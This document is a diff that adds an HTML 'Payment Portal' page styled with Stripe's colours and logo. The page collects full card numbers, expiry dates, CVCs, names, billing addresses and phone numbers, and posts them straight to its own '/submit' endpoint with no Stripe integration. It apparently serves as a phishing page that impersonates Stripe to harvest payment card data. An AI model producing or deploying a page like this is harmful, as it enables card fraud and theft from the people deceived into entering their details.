@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Payment Portal</title>
+    <style>
+        :root {
+            --stripe-blue: #635bff;
+            --stripe-dark: #0a2540;
+            --stripe-gray: #425466;
+            --border-color: #e6ebf1;
+            --bg-color: #f6f9fc;
+        }
+
+        body {                                                                      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+            color: var(--stripe-dark);
+        }
+
+        .container {
+            background: #fff;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 15px 35px rgba(50,50,93,0.1), 0 5px 15px rgba(0,0,0,0.07);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo-container {
+            margin-bottom: 24px;
+        }
+
+        label {
+            font-size: 14px;
+            font-weight: 500;
+            display: block;
+            margin-bottom: 8px;
+            color: var(--stripe-dark);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: box-shadow 0.15s ease, border-color 0.15s ease;
+            color: var(--stripe-dark);
+            font-family: inherit;
+        }
+
+        input::placeholder {
+            color: #aab7c4;
+        }
+
+        input:focus {
+            border-color: #80e9ff;
+            outline: none;
+            box-shadow: 0 1px 3px rgba(50,50,93,0.15), 0 1px 0 rgba(0,0,0,0.02);
+        }
+
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        button {
+            width: 100%;
+            background: var(--stripe-blue);
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: filter 0.2s;
+        }
+
+        button:hover {
+            filter: brightness(1.1);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        .amt-box {
+            background: #ffffff;
+            border: 1px solid var(--border-color);
+            color: var(--stripe-blue);
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            width: 100%;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Stripe" height="28">
+        </div>
+
+        <form action="/submit" method="POST">
+            <label for="amount">Amount to pay</label>
+            <input type="text" name="amount" id="amount" class="amt-box" value="$ 0.00">
+
+            <label for="cardnumber">Card information</label>
+            <input type="text" name="cardnumber" id="cardnumber" placeholder="1234 5678 1234 5678" required maxlength="19" inputmode="numeric" autocomplete="cc-number">
+            <div class="row">
+                <input type="text" name="exp" id="exp" placeholder="MM / YY" required maxlength="7" style="flex:1;" inputmode="numeric" autocomplete="cc-exp">
+                <input type="text" name="cvv" id="cvv" placeholder="CVC" required maxlength="4" style="flex:1;" inputmode="numeric" autocomplete="cc-csc">
+            </div>
+
+            <label for="cardname">Name on card</label>
+            <input type="text" name="cardname" id="cardname" placeholder="Full name" required autocomplete="cc-name">
+
+            <label for="address">Billing address</label>
+            <input type="text" name="address" id="address" placeholder="Address" required autocomplete="street-address">
+            <div class="row">
+                <input type="text" name="city" id="city" placeholder="City" required style="flex:2;" autocomplete="address-level2">
+                <input type="text" name="state" id="state" placeholder="State" required style="flex:1;" autocomplete="address-level1">
+                <input type="text" name="zip" id="zip" placeholder="ZIP" required style="flex:1.5;" inputmode="numeric" autocomplete="postal-code">
+            </div>
+
+            <label for="phone">Contact information</label>
+            <input type="tel" name="phone" id="phone" placeholder="Phone number" required inputmode="tel" autocomplete="tel">
+
+            <button type="submit">Pay now</button>
+        </form>
+    </div>
+
+    <script>
+        // Currency formatting
+        const amtInput = document.getElementById("amount");
+        amtInput.addEventListener("input", e => {
+            let v = e.target.value.replace(/[^0-9.]/g, "");
+            e.target.value = v ? "$ " + v : "$ ";
+        });
+
+        // Credit Card formatting (adds spaces every 4 digits)
+        const ccInput = document.getElementById("cardnumber");
+        ccInput.addEventListener("input", e => {
+            let v = e.target.value.replace(/\D/g, "");
+            v = v.replace(/(.{4})/g, "$1 ").trim();
+            e.target.value = v;
+        });
+
+        // Expiration Date formatting (adds slash after MM)
+        const expInput = document.getElementById("exp");
+        expInput.addEventListener("input", e => {
+            let v = e.target.value.replace(/\D/g, "");
+            if (v.length > 2) {
+                v = v.substring(0, 2) + " / " + v.substring(2, 4);
+            }
+            e.target.value = v;
+        });
+    </script>
+</body>
+</html>
